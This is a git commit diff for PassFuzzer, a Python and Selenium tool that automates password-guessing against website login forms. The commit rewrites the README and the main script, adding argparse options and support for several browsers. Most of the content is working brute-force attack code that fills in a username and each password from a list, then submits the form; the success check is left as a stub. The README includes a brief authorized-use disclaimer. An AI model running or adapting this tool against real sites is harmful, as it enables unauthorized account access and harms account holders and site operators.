3777d48c9e3ea6e370d720ad001792a0c36b2a0e
Nikunj Vashishtha <60650449+NikunjVashishtha@users.noreply.github.com>
2025-06-01 17:20:32 +0530

    Add files via upload

--- README.md
+++ README.md
@@ -1,39 +1,59 @@
 # PassFuzzer
-PassFuzzer is a brute force tool that can be used to brute force most of the websites.<br>
-Based on Hatch [By: MetaChar]
 
-## Commands
+PassFuzzer is a brute-force tool for testing login forms on websites using Selenium and password lists.
 
-```
--h, --help            show this help message and exit<br>
--u, --username        Choose the username<br>
---usernamese          Choose the username selector<br>
---passsel             Choose the password selector<br>
---loginsel            Choose the login button selector<br>
---passlist            Enter the password list directory<br>
---website             Choose a website<br>
-```
-
-## Installation Instructions
+## Command Line Arguments
 
 ```
+-h, --help            Show this help message and exit
+-l, --username        Username to brute-force
+-u, --usernamesel     Username input field selector (name attribute)
+-p, --passsel         Password input field selector (name attribute)
+-b, --loginsel        Login button selector (name attribute)
+-P, --passlist        Path to password list file
+-w, --website         Target website URL
+-d, --driver          Path to browser WebDriver executable
+-B, --browser         Browser to use (edge/chrome/firefox)
+```
+
+## Installation
+
+```sh
 git clone https://github.com/NikunjVashishtha/PassFuzzer
-python main.py
+cd PassFuzzer-main
+pip install selenium requests
 ```
 
 ## Requirements
-```
-pip install selenium
-pip install requests
-```
-<b>⚠️<u> Important: Browser and its driver are required</u></b>
 
-You can download it from the browser's official page.
-For this fork, create a folder in your C drive called 'webdrivers' and place the executable file inside. If you want to use a different directory, simply change the CHROME_DVR_DIR variable inside the python file.
+- Python 3.x
+- [Selenium](https://pypi.org/project/selenium/)
+- [Requests](https://pypi.org/project/requests/)
+- A supported browser (Edge, Chrome, Firefox, etc.) and its matching WebDriver
 
-## How to use it?
-1) Find the website URL with the login page.<br>
-2) Inspect element to find the Selector of the username, password field and login button.<br>
-3) Put in the username to brute force.<br>
-4) Add file of list of passwords
-5) Watch the action
+## Usage
+
+1. Find the login page URL of the target website.
+2. Inspect the login form to get the `name` attributes for the username, password, and login button fields.
+3. Prepare a username and a password list file.
+4. Download the appropriate WebDriver for your browser and note its path.
+5. Run PassFuzzer with the required arguments, for example:
+
+   ```sh
+   python main.py -l myuser -u username_field -p password_field -b login_button -P passwords.txt -w https://example.com/login -d /path/to/webdriver -B chrome
+   ```
+
+   Or, run without arguments and follow the interactive prompts:
+
+   ```sh
+   python main.py
+   ```
+
+## Notes
+
+- This tool is for educational and authorized testing purposes only.
+- Make sure your WebDriver version matches your browser version.
+- Works on Linux, macOS, and Windows (with correct driver path).
+
+---
+**Author:** Sparky99
--- main.py
+++ main.py
@@ -1,128 +1,20 @@
 import sys
-import datetime
 import requests
 from selenium import webdriver
-from optparse import OptionParser
 from selenium.webdriver.common.by import By
-from selenium.webdriver.edge.service import Service
-from selenium.common.exceptions import NoSuchElementException
+from selenium.common.exceptions import NoSuchElementException, WebDriverException
+import argparse
 
-# Graphics
 class color:
-    PURPLE = '\033[95m'
-    CYAN = '\033[96m'
-    DARKCYAN = '\033[36m'
-    BLUE = '\033[94m'
     GREEN = '\033[92m'
-    YELLOW = '\033[93m'
     RED = '\033[91m'
+    CYAN = '\033[96m'
+    YELLOW = '\033[93m'
     BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
     END = '\033[0m'
-    WHITE = '\33[37m'
+    WHITE = '\033[37m'
 
-
-# Config#
-parser = OptionParser()
-now = datetime.datetime.now()
-
-
-# Args
-parser.add_option('-l', '--username', dest='username',
-                  help='Choose the username')
-parser.add_option('-u', '--usernamesel', dest='usernamesel',
-                  help='Choose the username selector')
-parser.add_option('-p', '--passsel', dest='passsel',
-                  help='Choose the password selector')
-parser.add_option('-b', '--loginsel', dest='loginsel',
-                  help='Choose the login button selector')
-parser.add_option('-P', '--passlist', dest='passlist',
-                  help='Enter the password list directory')
-parser.add_option('-w', '--website', dest='website', help='choose a website')
-(c_options, args) = parser.parse_args()
-
-BROWSER_DVR_DIR = 'C:\\webdrivers\\BROWSERdriver.exe'
-
-
-def wizard():
-    print(banner)
-    website = input(
-        f'{color.GREEN + color.BOLD}\n[~] {color.WHITE}Enter a website: ')
-    sys.stdout.write(f'{color.YELLOW}[?] {color.WHITE}Checking if site exists ')
-    sys.stdout.flush()
-    try:
-        request = requests.get(website)
-        if request.status_code == 200:
-            print(f'{color.GREEN}[OK] {color.WHITE}')
-            sys.stdout.flush()
-    except NoSuchElementException:
-        pass
-    except requests.exceptions.MissingSchema:
-        print(f'{color.RED}[X] \n[!] {color.WHITE}Invalid URL. Make sure you use http/https only.')
-        exit(1)
-    except requests.ConnectTimeout:
-        print(color.RED + '[X]' + color.YELLOW +
-              '\n[!] '+color.WHITE + 'Connection timed out')
-        exit(1)
-    except KeyboardInterrupt:
-        print(color.RED + '[!] ' + color.WHITE + 'Exited upon user request...')
-        exit()
-    except:
-        print(color.RED + '[X]' + color.WHITE)
-        print(color.RED + '[!]' + color.WHITE +
-              ' Website could not be located make sure to use http / https')
-        exit()
-
-    userStr = input(
-        color.GREEN + '[~] ' + color.WHITE + 'Enter the username selector: ')
-    passStr = input(
-        color.GREEN + '[~] ' + color.WHITE + 'Enter the password selector: ')
-    lBtnStr = input(
-        color.GREEN + '[~] ' + color.WHITE + 'Enter the Login button selector: ')
-    user = input(
-        color.GREEN + '[~] ' + color.WHITE + 'Enter the username to brute-force: ')
-    passList = input(
-        color.GREEN + '[~] ' + color.WHITE + 'Enter a directory to a password list: ')
-    brutes(user, userStr, passStr, lBtnStr, passList, website)
-
-
-def brutes(uName, unameStr, passStr, lBtnStr, passList, website):
-    options = webdriver.EdgeOptions()
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    passFile = open(passList, 'r')
-    try:
-        global driver
-        driver = Service(BROWSER_DVR_DIR)
-    except:
-        print(
-            f'{color.RED}\n[?] {color.WHITE}Webdriver binary couldn\'t be found.')
-    browser = webdriver.Edge(service=driver)
-    temp = ''
-    browser.get(website)
-    while True:
-        try:
-            for passTryOption in passFile:
-                try:
-                    UserSltr = browser.find_element(By.NAME, unameStr)
-                    PassSltr = browser.find_element(By.NAME, passStr)
-                    btn = browser.find_element(By.NAME, lBtnStr)
-                    UserSltr.send_keys(uName)
-                    PassSltr.send_keys(passTryOption)
-                    temp = passTryOption
-                    print(f'{color.CYAN}Tried: {color.WHITE + temp}')
-                except KeyboardInterrupt:
-                    print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
-                    exit()
-                except NoSuchElementException:
-                    print(
-                        f'{color.CYAN}Password has been found: {color.WHITE + temp}')
-                    exit()
-        except KeyboardInterrupt:
-            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
-            exit()
-
-
-banner = color.BOLD + color.YELLOW + '''
+banner = f"""{color.BOLD}{color.YELLOW}
  ######                           #######                                         
  #     #    ##     ####    ####   #        #    #  ######  ######  ######  #####  
  #     #   #  #   #       #       #        #    #      #       #   #       #    # 
@@ -131,29 +23,129 @@ banner = color.BOLD + color.YELLOW + '''
  #        #    #  #    #  #    #  #        #    #   #       #      #       #   #  
  #        #    #   ####    ####   #         ####   ######  ######  ######  #    # 
 
-{0} Password Brute-force tool
-{0} Version 1.0
-{0} Author: Sparky99
-'''.format(color.CYAN)
+{color.CYAN}Password Brute-force tool
+{color.CYAN}Version 1.0
+{color.CYAN}Author: Sparky99
+{color.END}
+"""
 
-if c_options.username == None:
-    if c_options.usernamesel == None:
-        if c_options.passsel == None:
-            if c_options.loginsel == None:
-                if c_options.passlist == None:
-                    if c_options.website == None:
-                        try:
-                            wizard()
-                        except KeyboardInterrupt:
-                            print(f'{color.RED}\n[#] {color.WHITE}Exited upon user request...')
-                            exit()
+def check_website(url):
+    try:
+        resp = requests.get(url, timeout=5)
+        if resp.status_code == 200:
+            print(f'{color.GREEN}[OK] {color.WHITE}')
+            return True
+        else:
+            print(f'{color.RED}[X] {color.WHITE}Site returned status {resp.status_code}')
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f'{color.RED}[X] {color.WHITE}Error: {e}')
+        return False
 
+def get_browser_driver(browser, driver_path):
+    """Return a Selenium WebDriver instance for the specified browser."""
+    browser = browser.lower()
+    if browser == "edge":
+        from selenium.webdriver.edge.service import Service as EdgeService
+        options = webdriver.EdgeOptions()
+        options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        service = EdgeService(driver_path)
+        return webdriver.Edge(service=service, options=options)
+    elif browser == "chrome":
+        from selenium.webdriver.chrome.service import Service as ChromeService
+        options = webdriver.ChromeOptions()
+        options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        service = ChromeService(driver_path)
+        return webdriver.Chrome(service=service, options=options)
+    elif browser == "firefox":
+        from selenium.webdriver.firefox.service import Service as FirefoxService
+        options = webdriver.FirefoxOptions()
+        service = FirefoxService(driver_path)
+        return webdriver.Firefox(service=service, options=options)
+    else:
+        print(f"{color.RED}Unsupported browser: {browser}{color.END}")
+        sys.exit(1)
 
-user = c_options.username
-userStr = c_options.usernamesel
-passStr = c_options.passsel
-lBtnStr = c_options.loginsel
-website = c_options.website
-passList = c_options.passlist
-print(banner)
-brutes(user, userStr, passStr, lBtnStr, passList, website)
+def brutes(uName, unameStr, passStr, lBtnStr, passList, website, driver_path, browser):
+    try:
+        browser_driver = get_browser_driver(browser, driver_path)
+    except WebDriverException as e:
+        print(f'{color.RED}Webdriver error: {e}{color.END}')
+        sys.exit(1)
+    browser_driver.get(website)
+    with open(passList, 'r', encoding='utf-8', errors='ignore') as passFile:
+        for password in passFile:
+            password = password.strip()
+            try:
+                user_elem = browser_driver.find_element(By.NAME, unameStr)
+                pass_elem = browser_driver.find_element(By.NAME, passStr)
+                btn_elem = browser_driver.find_element(By.NAME, lBtnStr)
+                user_elem.clear()
+                pass_elem.clear()
+                user_elem.send_keys(uName)
+                pass_elem.send_keys(password)
+                btn_elem.click()
+                print(f'{color.CYAN}Tried: {color.WHITE}{password}')
+                # Add logic here to check if login was successful
+            except NoSuchElementException:
+                print(f'{color.RED}Element not found. Check your selectors.{color.END}')
+                break
+            except KeyboardInterrupt:
+                print(f'{color.RED}[#] {color.WHITE}Exited upon user request...{color.END}')
+                browser_driver.quit()
+                sys.exit(0)
+    browser_driver.quit()
+
+def wizard():
+    print(banner)
+    website = input(f'{color.GREEN}[~] {color.WHITE}Enter a website: ')
+    if not check_website(website):
+        sys.exit(1)
+    userStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the username selector: ')
+    passStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the password selector: ')
+    lBtnStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the Login button selector: ')
+    user = input(f'{color.GREEN}[~] {color.WHITE}Enter the username to brute-force: ')
+    passList = input(f'{color.GREEN}[~] {color.WHITE}Enter a directory to a password list: ')
+    driver_path = input(f'{color.GREEN}[~] {color.WHITE}Enter the path to your WebDriver: ')
+    browser = input(f'{color.GREEN}[~] {color.WHITE}Enter browser (edge/chrome/firefox): ')
+    brutes(user, userStr, passStr, lBtnStr, passList, website, driver_path, browser)
+
+def main():
+    parser = argparse.ArgumentParser(description='Password Brute-force tool')
+    parser.add_argument('-l', '--username', help='Username to brute-force')
+    parser.add_argument('-u', '--usernamesel', help='Username selector')
+    parser.add_argument('-p', '--passsel', help='Password selector')
+    parser.add_argument('-b', '--loginsel', help='Login button selector')
+    parser.add_argument('-P', '--passlist', help='Password list file')
+    parser.add_argument('-w', '--website', help='Target website')
+    parser.add_argument('-d', '--driver', help='Path to browser WebDriver')
+    parser.add_argument('-B', '--browser', help='Browser to use (edge/chrome/firefox)')
+    args = parser.parse_args()
+
+    required = ['username', 'usernamesel', 'passsel', 'loginsel', 'passlist', 'website', 'driver', 'browser']
+    if all(getattr(args, arg) is None for arg in required):
+        try:
+            wizard()
+        except KeyboardInterrupt:
+            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...{color.END}')
+            sys.exit(0)
+    else:
+        missing = [arg for arg in required if getattr(args, arg) is None]
+        if missing:
+            print(f'{color.RED}Missing arguments: {", ".join(missing)}{color.END}')
+            parser.print_help()
+            sys.exit(1)
+        print(banner)
+        brutes(
+            args.username,
+            args.usernamesel,
+            args.passsel,
+            args.loginsel,
+            args.passlist,
+            args.website,
+            args.driver,
+            args.browser
+        )
+
+if __name__ == '__main__':
+    main()
